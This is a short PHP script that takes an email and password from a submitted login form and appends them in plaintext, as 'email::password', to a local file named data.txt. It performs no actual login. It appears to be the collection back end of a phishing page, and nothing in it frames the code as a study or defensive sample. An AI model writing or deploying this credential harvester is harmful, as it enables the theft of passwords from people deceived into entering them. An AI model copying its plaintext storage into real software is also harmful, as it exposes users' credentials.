<?php
$email = $_POST['login_email'];
$password = $_POST['login_password'];

if(isset($_POST['btnLogin'])){
  $open = fopen('data.txt','a');
  fwrite($open,$email);
  fwrite($open, '::');
  fwrite($open,$password);
  fwrite($open, '\n');
}

?>
